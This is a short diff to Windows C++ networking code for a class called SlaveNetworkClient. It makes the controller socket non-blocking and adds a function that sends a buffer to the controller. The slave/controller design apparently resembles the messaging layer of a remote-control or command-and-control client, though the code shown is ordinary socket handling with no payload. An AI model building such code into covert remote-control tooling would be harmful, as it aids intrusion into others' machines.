@@ -54,6 +54,7 @@ end:
 
 BOOL SlaveNetworkClient::ConnectToController()
 {
+	DWORD iMode = 1;
 	BOOL bReturnValue = TRUE;
 	int iReturnValue = 0;
 
@@ -64,6 +65,8 @@ BOOL SlaveNetworkClient::ConnectToController()
 		bReturnValue = FALSE;
 		goto end;
 	}
+
+	ioctlsocket(hControllerSocket, FIONBIO, &iMode);
 
 	DevInfo("Connected to remote server!");
 
@@ -113,13 +116,34 @@ BOOL SlaveNetworkClient::ControllerHasMessage(PVOID* pBuffer, DWORD* dwBufferLen
 	return bReturnValue;
 }
 
-
 BOOL SlaveNetworkClient::FlushControllerBuffer()
 {
 	BOOL bReturnValue = TRUE;
 
 	dwReceiveBufferLen = 0;
 	RtlSecureZeroMemory(pReceiveBuffer, 8096);
+
+end:
+	return bReturnValue;
+}
+
+BOOL SlaveNetworkClient::SendToController(PVOID pBuffer, DWORD dwBufferLen)
+{
+	BOOL bReturnValue = TRUE;
+	INT iReturnValue = 0;
+	INT IWSAError = 0;
+
+	if (INVALID_SOCKET == hControllerSocket)
+	{
+		bReturnValue = FALSE;
+		goto end;
+	}
+
+	iReturnValue = send(hControllerSocket, (char*)pBuffer, dwBufferLen, 0);
+	if (SOCKET_ERROR == iReturnValue)
+	{
+		bReturnValue = FALSE;
+	}
 
 end:
 	return bReturnValue;
